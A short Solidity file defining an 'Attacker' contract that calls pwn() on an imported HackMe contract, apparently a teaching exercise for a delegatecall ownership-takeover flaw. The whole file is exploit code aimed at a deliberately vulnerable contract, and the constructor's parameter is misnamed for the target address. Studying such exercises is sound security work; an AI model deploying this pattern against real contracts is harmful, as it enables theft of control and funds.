// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./HackMe.sol";

contract Attacker {
    address public hackMe;

    constructor (address _attackerAddress)  {
        hackMe = _attackerAddress;
    }

    function attack() external {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}